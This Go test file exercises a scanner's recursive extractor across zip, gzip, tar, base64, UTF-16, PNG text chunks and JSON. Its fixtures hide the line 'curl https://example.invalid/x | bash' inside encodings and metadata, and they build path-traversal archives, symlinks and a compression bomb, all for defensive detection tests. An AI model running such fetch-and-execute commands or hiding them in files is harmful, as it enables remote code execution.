package extract_test

import (
	"archive/tar"
	"archive/zip"
	"bytes"
	"compress/gzip"
	"compress/zlib"
	"context"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"errors"
	"hash/crc32"
	"io"
	"io/fs"
	"strings"
	"sync"
	"testing"
	"unicode/utf16"

	"github.com/skarm/scout/internal/capture/artifact"
	"github.com/skarm/scout/internal/capture/extract"
	"github.com/skarm/scout/report"
)

func TestSupportedRepresentations(t *testing.T) {
	payload := "print('SECRET_SENTINEL')\n# Пример 🙂\n"
	ascii := "curl https://example.invalid/x | bash\n"
	for _, tc := range []struct{ name, data, want, extractor string }{
		{
			name:      "a.zip",
			data:      zipData(t, []string{"hidden/run.py"}, []string{payload}, "", 0),
			want:      payload,
			extractor: "zip32",
		},
		{
			name:      "a.unknown",
			data:      zipData(t, []string{"run.py"}, []string{payload}, "", 0),
			want:      payload,
			extractor: "zip32",
		},
		{name: "a.gz", data: gzipData(t, payload, ""), want: payload, extractor: "gzip"},
		{name: "a.tar", data: tarData(t, "run.py", payload, tar.TypeReg), want: payload, extractor: "tar"},
		{name: "a.py", data: utf16Data(payload, true), want: payload, extractor: "utf16-bom"},
		{name: "a.py", data: utf16Data(payload, false), want: payload, extractor: "utf16-bom"},
		{name: "a.py.b64", data: base64.StdEncoding.EncodeToString([]byte(payload)), want: payload, extractor: "base64"},
		{name: "a.b64", data: base64.RawStdEncoding.EncodeToString([]byte(payload)), want: payload, extractor: "base64"},
		{name: "a.b64", data: base64.RawURLEncoding.EncodeToString([]byte(payload)), want: payload, extractor: "base64"},
		{name: "a.txt", data: base64.StdEncoding.EncodeToString([]byte(payload)), want: payload, extractor: "base64"},
		{
			name:      "a.bin",
			data:      "\x00\xffdata:text/x-python;base64," + base64.StdEncoding.EncodeToString([]byte(payload)) + "\x00",
			want:      payload,
			extractor: "base64",
		},
		{name: "a.png", data: pngData(pngChunk("tEXt", "key\x00"+ascii)), want: ascii, extractor: "png-text"},
		{name: "a.png", data: pngData(pngChunk("tEXt", "key\x00caf\xe9")), want: "café", extractor: "png-text"},
		{
			name:      "a.png",
			data:      pngData(pngChunk("zTXt", "key\x00\x00"+zlibData(t, ascii))),
			want:      ascii,
			extractor: "png-text",
		},
		{
			name:      "a.png",
			data:      pngData(pngChunk("iTXt", "key\x00\x00\x00en\x00key\x00"+payload)),
			want:      payload,
			extractor: "png-text",
		},
		{
			name:      "a.png",
			data:      pngData(pngChunk("iTXt", "key\x00\x01\x00\x00\x00"+zlibData(t, payload))),
			want:      payload,
			extractor: "png-text",
		},
	} {
		t.Run(tc.extractor+"/"+tc.name, func(t *testing.T) {
			r := expand(t, tc.name, tc.data, report.DefaultExtractionLimits())
			if !contains(r, tc.want) {
				t.Fatalf("missing output: steps=%+v diagnostics=%+v", r.Report.Steps, r.Diagnostics)
			}
			obj := r.Report.Objects[0]
			if obj.ExtractorID != tc.extractor || obj.ParentPath != tc.name || obj.ParentSHA256 != artifact.Hash([]byte(tc.data)) || obj.CoordinateSpace != "derived-bytes" || obj.Depth != 1 {
				t.Fatalf("provenance: %+v", obj)
			}
			if !strings.HasPrefix(obj.File.Path, "scout-object://") || obj.File.SHA256 != artifact.Hash([]byte(r.Files[0].Content())) {
				t.Fatal("invalid derived identity")
			}
			b, e := json.Marshal(r.Report)
			if e != nil || bytes.Contains(b, []byte("SECRET_SENTINEL")) {
				t.Fatal("report leaked source")
			}
		})
	}
}

func TestRecursiveGraph(t *testing.T) {
	payload := "#!/usr/bin/env python3\nprint('SECRET_SENTINEL')\n"
	encoded := base64.StdEncoding.EncodeToString([]byte(utf16Data(payload, true)))
	data := zipData(t, []string{"run.py.b64.gz"}, []string{gzipData(t, encoded, "")}, "", 0)
	r := expand(t, "bundle.zip", data, report.DefaultExtractionLimits())
	if !contains(r, payload) {
		t.Fatalf("recursive decode lost: %+v", r.Report.Steps)
	}
	seen := map[string]string{"bundle.zip": artifact.Hash([]byte(data))}
	for _, obj := range r.Report.Objects {
		if seen[obj.ParentPath] != obj.ParentSHA256 {
			t.Fatal("broken parent chain")
		}
		if _, ok := seen[obj.File.Path]; ok {
			t.Fatal("duplicate identity")
		}
		seen[obj.File.Path] = obj.File.SHA256
	}
	if r.Report.Objects[len(r.Report.Objects)-1].Depth != 4 {
		t.Fatal("wrong depth")
	}
}

func TestGZIPMultipleMembersAndBadTrailer(t *testing.T) {
	first := gzipData(t, "first", "metadata")
	second := gzipData(t, "second", "")
	r := expand(t, "data.gz", first+second, report.DefaultExtractionLimits())
	if !contains(r, "first") || !contains(r, "second") || !contains(r, "metadata") {
		t.Fatal("member/metadata lost")
	}
	r = expand(t, "data.gz", first+"junk", report.DefaultExtractionLimits())
	if !contains(r, "first") || !issue(r, "extraction_invalid_or_unsupported") {
		t.Fatal("trailing bytes ignored or good output lost")
	}
	broken := []byte(second)
	broken[len(broken)-8] ^= 0xff
	r = expand(t, "data.gz", first+string(broken), report.DefaultExtractionLimits())
	if !contains(r, "first") || contains(r, "second") || !issue(r, "extraction_invalid_or_unsupported") {
		t.Fatal("CRC failure accepted")
	}
}

func TestBadRepresentations(t *testing.T) {
	badCRC := []byte(pngData(pngChunk("tEXt", "k\x00payload")))
	badCRC[len(badCRC)-17] ^= 0xff
	for _, tc := range []struct{ name, data string }{
		{name: "bad.zip", data: "PK\x03\x04"},
		{name: "traversal.zip", data: zipData(t, []string{"../host"}, []string{"secret"}, "", 0)},
		{name: "duplicate.zip", data: zipData(t, []string{"A", "a"}, []string{"x", "y"}, "", 0)},
		{name: "link.zip", data: zipData(t, []string{"link"}, []string{"/outside"}, "", fs.ModeSymlink|0o777)},
		{name: "link.tar", data: tarData(t, "link", "", tar.TypeSymlink)},
		{name: "bad.tar", data: tarData(t, "../outside", "x", tar.TypeReg)},
		{name: "bad.gz", data: "\x1f\x8bgarbage"},
		{name: "bad.b64", data: "YWJj=garbage"},
		{name: "bad.b64", data: "AB=="}, // nonzero padding bits: Strict must reject
		{name: "odd.txt", data: "\xff\xfeX"},
		{name: "high.txt", data: "\xff\xfe\x00\xd8"},
		{name: "low.txt", data: "\xff\xfe\x00\xdc"},
		{name: "pair.txt", data: "\xff\xfe\x00\xd8A\x00"},
		{name: "utf32.txt", data: "\xff\xfe\x00\x00A\x00\x00\x00"},
		{name: "bad.png", data: string(badCRC)},
		{name: "bad.png", data: pngData(pngChunk("zTXt", "k\x00\x01garbage"))},
		{name: "bad.png", data: pngData(pngChunk("iTXt", "k\x00\x02\x00\x00\x00garbage"))},
	} {
		t.Run(tc.name, func(t *testing.T) {
			r := expand(t, tc.name, tc.data, report.DefaultExtractionLimits())
			if !issue(r, "extraction_invalid_or_unsupported") {
				t.Fatalf("bad input not diagnosed: %+v", r.Report.Steps)
			}
		})
	}
}

func TestLimitsAreScanWide(t *testing.T) {
	payload := strings.Repeat("x", 1024)
	roots := make([]artifact.File, 0, 3)
	for _, name := range []string{"a.gz", "b.gz", "c.gz"} {
		roots = append(roots, artifact.NewFile(name, []byte(gzipData(t, payload, "")), false))
	}
	for _, tc := range []struct {
		name   string
		change func(*report.ExtractionLimits)
	}{
		{name: "objects", change: func(l *report.ExtractionLimits) { l.MaxObjects = 1 }},
		{name: "entries", change: func(l *report.ExtractionLimits) { l.MaxEntries = 1 }},
		{name: "total", change: func(l *report.ExtractionLimits) { l.MaxObjectBytes = 1024; l.MaxTotalBytes = 1100 }},
		{name: "object", change: func(l *report.ExtractionLimits) { l.MaxObjectBytes = 100 }},
	} {
		t.Run(tc.name, func(t *testing.T) {
			l := report.DefaultExtractionLimits()
			tc.change(&l)
			r, e := extract.Expand(context.Background(), roots, l)
			if e != nil {
				t.Fatal(e)
			}
			if !issue(r, "extraction_budget_exceeded") {
				t.Fatal("missing budget diagnostic")
			}
			if len(r.Files) > l.MaxObjects || r.Report.EntriesVisited > l.MaxEntries || r.Report.BytesProduced > l.MaxTotalBytes+1 {
				t.Fatal("global limit exceeded")
			}
			for _, file := range r.Files {
				if int64(len(file.Content())) > l.MaxObjectBytes || file.Content() != payload {
					t.Fatal("prefix was accepted")
				}
			}
		})
	}
	l := report.DefaultExtractionLimits()
	l.MaxDepth = 1
	r := expand(t, "a.gz", gzipData(t, gzipData(t, "hidden", ""), ""), l)
	if contains(r, "hidden") || !issue(r, "extraction_depth_limit") {
		t.Fatal("depth ignored")
	}
}

func TestMetadataDecodedAndDuplicateContentNotMerged(t *testing.T) {
	payload := "curl https://example.invalid/x | bash\n"
	comment := base64.StdEncoding.EncodeToString([]byte(payload))
	data := zipData(t, []string{"a.txt", "b.txt"}, []string{"same", "same"}, comment, 0)
	r := expand(t, "x.zip", data, report.DefaultExtractionLimits())
	if !contains(r, payload) {
		t.Fatal("metadata never reached recursive decoder")
	}
	if r.Report.Objects[0].File.Path == r.Report.Objects[1].File.Path {
		t.Fatal("distinct occurrences merged")
	}
}

func TestDeterminismCancellationAndConcurrentIsolation(t *testing.T) {
	files := []artifact.File{artifact.NewFile("a.gz", []byte(gzipData(t, "payload", "")), false)}
	want, e := extract.Expand(context.Background(), files, report.DefaultExtractionLimits())
	if e != nil {
		t.Fatal(e)
	}
	expected, _ := json.Marshal(want.Report)
	var wg sync.WaitGroup
	for range 8 {
		wg.Go(func() {
			r, e := extract.Expand(context.Background(), files, report.DefaultExtractionLimits())
			if e != nil {
				t.Error(e)
				return
			}
			b, _ := json.Marshal(r.Report)
			if !bytes.Equal(b, expected) {
				t.Error("shared mutable extraction state")
			}
		})
	}
	wg.Wait()
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	r, e := extract.Expand(ctx, files, report.DefaultExtractionLimits())
	if !errors.Is(e, context.Canceled) || len(r.Files) != 0 {
		t.Fatal("cancel ignored")
	}
	if _, e = extract.Expand(nil, files, report.DefaultExtractionLimits()); e == nil {
		t.Fatal("nil context")
	}
	l := report.DefaultExtractionLimits()
	l.MaxDepth = 0
	if _, e = extract.Expand(context.Background(), files, l); e == nil {
		t.Fatal("invalid limits")
	}
}

func TestNoGenericDecodingOfOrdinaryProse(t *testing.T) {
	for _, text := range []string{strings.Repeat("a readable sentence without punctuation ", 5), "-----BEGIN PRIVATE KEY-----\nABC\n-----END PRIVATE KEY-----", "ordinary text"} {
		r := expand(t, "readme.txt", text, report.DefaultExtractionLimits())
		if len(r.Report.Steps) != 0 {
			t.Fatal("ordinary text treated as Base64")
		}
	}
}

func FuzzExtractBounded(f *testing.F) {
	f.Add("x.zip", []byte(zipData(f, []string{"a.txt"}, []string{"hello"}, "", 0)))
	f.Add("x.gz", []byte(gzipData(f, "hello", "")))
	f.Add("x.tar", []byte(tarData(f, "a", "hello", tar.TypeReg)))
	f.Add("x.png", []byte(pngData(pngChunk("tEXt", "k\x00hello"))))
	f.Add("x.txt", []byte(utf16Data("hello🙂", true)))
	f.Add("x.b64", []byte("aGVsbG8="))
	f.Fuzz(func(t *testing.T, name string, data []byte) {
		if len(data) > 8192 || len(name) > 64 {
			t.Skip()
		}
		l := report.ExtractionLimits{
			MaxDepth:       3,
			MaxObjects:     8,
			MaxEntries:     32,
			MaxObjectBytes: 2048,
			MaxTotalBytes:  4096,
		}
		r, e := extract.Expand(context.Background(), []artifact.File{artifact.NewFile(name, data, false)}, l)
		if e != nil {
			t.Fatal(e)
		}
		if len(r.Files) > l.MaxObjects || r.Report.BytesProduced > l.MaxTotalBytes+1 || r.Report.EntriesVisited > l.MaxEntries {
			t.Fatal("budget violated")
		}
		for i, obj := range r.Report.Objects {
			if int64(len(r.Files[i].Content())) > l.MaxObjectBytes || obj.File.SHA256 != artifact.Hash([]byte(r.Files[i].Content())) {
				t.Fatal("invalid child")
			}
		}
	})
}

func BenchmarkExtractNested(b *testing.B) {
	payload := strings.Repeat("ordinary decoded words.\n", 1024)
	data := zipData(b, []string{"a.txt.gz"}, []string{gzipData(b, payload, "")}, "", 0)
	files := []artifact.File{artifact.NewFile("a.zip", []byte(data), false)}
	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		if _, e := extract.Expand(context.Background(), files, report.DefaultExtractionLimits()); e != nil {
			b.Fatal(e)
		}
	}
}

func TestJSONStringsAndStructure(t *testing.T) {
	for _, tc := range []struct {
		name, data, want string
		bad              bool
	}{
		{name: "config.json", data: `{"cmd":"\u0063url x | \u0062ash"}`, want: "curl x | bash", bad: false},
		{name: "blob", data: `{"cmd":"payload"}`, want: "payload", bad: false},
		{name: "config.json", data: `{"k":"\ud83d\ude42"}`, want: "🙂", bad: false},
		{name: "bad.json", data: `{"k":"\ud800"}`, want: "", bad: true},
		{name: "bad.json", data: `{"k":"\udc00"}`, want: "", bad: true},
		{name: "bad.json", data: `{} {}`, want: "", bad: true},
		{name: "bad.json", data: `{"x":"value"`, want: "value", bad: true},
	} {
		t.Run(tc.name, func(t *testing.T) {
			r := expand(t, tc.name, tc.data, report.DefaultExtractionLimits())
			if tc.want != "" && !contains(r, tc.want) {
				t.Fatal("string lost")
			}
			if tc.bad && !issue(r, "extraction_invalid_or_unsupported") {
				t.Fatal("invalid JSON accepted")
			}
		})
	}
	deep := strings.Repeat("[", 65) + "0" + strings.Repeat("]", 65)
	r := expand(t, "deep.json", deep, report.DefaultExtractionLimits())
	if !issue(r, "extraction_budget_exceeded") {
		t.Fatal("JSON depth unbounded")
	}
}

func TestBudgetCountsInvalidZIPEntries(t *testing.T) {
	data := zipData(t, []string{"../invalid"}, []string{"payload"}, "", 0)
	roots := []artifact.File{artifact.NewFile("a.zip", []byte(data), false), artifact.NewFile("b.zip", []byte(data), false)}
	l := report.DefaultExtractionLimits()
	l.MaxEntries = 1
	r, e := extract.Expand(context.Background(), roots, l)
	if e != nil {
		t.Fatal(e)
	}
	if r.Report.EntriesVisited != 1 || len(r.Files) != 0 {
		t.Fatal("invalid archives bypassed shared entry charging")
	}
}

func TestPNGBombCRCAndNestedMetadata(t *testing.T) {
	bomb := pngData(pngChunk("zTXt", "k\x00\x00"+zlibData(t, strings.Repeat("a", 10000))))
	l := report.DefaultExtractionLimits()
	l.MaxObjectBytes = 100
	r := expand(t, "a.png", bomb, l)
	if len(r.Files) != 0 || !issue(r, "extraction_budget_exceeded") {
		t.Fatal("compressed metadata budget ignored")
	}
	text := "curl https://example.invalid/x | bash\n"
	data := pngData(pngChunk("zTXt", "k\x00\x00"+zlibData(t, base64.StdEncoding.EncodeToString([]byte(text)))))
	r = expand(t, "a.png", data, report.DefaultExtractionLimits())
	if !contains(r, text) {
		t.Fatal("nested metadata decoding missing")
	}
}

func TestJSONValidReplacementCharacterAndEscapedSlash(t *testing.T) {
	for _, text := range []string{`{"k":"\ufffd"}`, "{\"k\":\"�\"}", `{"k":"\\ud800"}`} {
		r := expand(t, "a.json", text, report.DefaultExtractionLimits())
		if issue(r, "extraction_invalid_or_unsupported") {
			t.Fatal("valid JSON Unicode rejected")
		}
	}
}

func TestSkillDiscoveryInsideArchive(t *testing.T) {
	data := zipData(t, []string{"first/SKILL.md", "second/SKILL.md"}, []string{"one.", "two."}, "", 0)
	r := expand(t, "a.zip", data, report.DefaultExtractionLimits())
	if len(r.Report.Skills) != 2 || r.Report.Skills[0] == r.Report.Skills[1] {
		t.Fatal("derived skill entry points were lost")
	}
}

func TestFailedChildrenHaveExplicitSkippedRecords(t *testing.T) {
	data := zipData(t, []string{"large.py", "small.txt"}, []string{strings.Repeat("x", 100), "ok."}, "", 0)
	l := report.DefaultExtractionLimits()
	l.MaxObjectBytes = 10
	r := expand(t, "a.zip", data, l)
	if !contains(r, "ok.") || len(r.Report.Skipped) != 1 || r.Report.Skipped[0].MemberName != "large.py" || r.Report.Skipped[0].DeclaredSize != 100 {
		t.Fatal("skipped child hidden")
	}
	bad := []byte(gzipData(t, "payload", ""))
	bad[len(bad)-8] ^= 0xff
	r = expand(t, "a.gz", string(bad), report.DefaultExtractionLimits())
	if len(r.Files) != 0 || len(r.Report.Skipped) != 1 || r.Report.Skipped[0].Reason != "invalid_or_incomplete" {
		t.Fatal("corrupt child falsely published")
	}
}

func zipData(t testing.TB, names, contents []string, comment string, mode fs.FileMode) string {
	t.Helper()
	var b bytes.Buffer
	w := zip.NewWriter(&b)
	if err := w.SetComment(comment); err != nil {
		t.Fatal(err)
	}
	for i, name := range names {
		h := &zip.FileHeader{Name: name, Method: zip.Deflate}
		if mode != 0 {
			h.SetMode(mode)
		}
		m, e := w.CreateHeader(h)
		if e != nil {
			t.Fatal(e)
		}
		if _, e = io.WriteString(m, contents[i]); e != nil {
			t.Fatal(e)
		}
	}
	if err := w.Close(); err != nil {
		t.Fatal(err)
	}
	return b.String()
}

func gzipData(t testing.TB, data, comment string) string {
	t.Helper()
	var b bytes.Buffer
	w := gzip.NewWriter(&b)
	w.Comment = comment
	if _, e := io.WriteString(w, data); e != nil {
		t.Fatal(e)
	}
	if e := w.Close(); e != nil {
		t.Fatal(e)
	}
	return b.String()
}

func tarData(t testing.TB, name, data string, typ byte) string {
	t.Helper()
	var b bytes.Buffer
	w := tar.NewWriter(&b)
	h := &tar.Header{Name: name, Size: int64(len(data)), Typeflag: typ, Mode: 0o600, Format: tar.FormatUSTAR}
	if typ == tar.TypeSymlink {
		h.Linkname = "/outside"
		h.Size = 0
		data = ""
	}
	if err := w.WriteHeader(h); err != nil {
		t.Fatal(err)
	}
	if _, err := io.WriteString(w, data); err != nil {
		t.Fatal(err)
	}
	if err := w.Close(); err != nil {
		t.Fatal(err)
	}
	return b.String()
}

func utf16Data(s string, little bool) string {
	var b bytes.Buffer
	var order binary.ByteOrder = binary.BigEndian
	b.Write([]byte{0xfe, 0xff})
	if little {
		order = binary.LittleEndian
		b.Reset()
		b.Write([]byte{0xff, 0xfe})
	}
	for _, u := range utf16.Encode([]rune(s)) {
		var v [2]byte
		order.PutUint16(v[:], u)
		b.Write(v[:])
	}
	return b.String()
}

func pngChunk(typ, data string) string {
	var b bytes.Buffer
	var v [4]byte
	binary.BigEndian.PutUint32(v[:], uint32(len(data)))
	b.Write(v[:])
	b.WriteString(typ)
	b.WriteString(data)
	binary.BigEndian.PutUint32(v[:], crc32.ChecksumIEEE([]byte(typ+data)))
	b.Write(v[:])
	return b.String()
}

func pngData(chunks ...string) string {
	ihdr := make([]byte, 13)
	ihdr[3] = 1
	ihdr[7] = 1
	ihdr[8] = 8
	ihdr[9] = 2
	return "\x89PNG\r\n\x1a\n" + pngChunk("IHDR", string(ihdr)) + strings.Join(chunks, "") + pngChunk("IEND", "")
}

func zlibData(t testing.TB, s string) string {
	t.Helper()
	var b bytes.Buffer
	w := zlib.NewWriter(&b)
	if _, e := io.WriteString(w, s); e != nil {
		t.Fatal(e)
	}
	if e := w.Close(); e != nil {
		t.Fatal(e)
	}
	return b.String()
}

func expand(t testing.TB, name, data string, limits report.ExtractionLimits) extract.Result {
	t.Helper()
	r, e := extract.Expand(context.Background(), []artifact.File{artifact.NewFile(name, []byte(data), false)}, limits)
	if e != nil {
		t.Fatal(e)
	}
	return r
}

func contains(r extract.Result, s string) bool {
	for _, f := range r.Files {
		if f.Content() == s {
			return true
		}
	}
	return false
}

func issue(r extract.Result, code string) bool {
	for _, d := range r.Diagnostics {
		if d.Code == code {
			return true
		}
	}
	return false
}
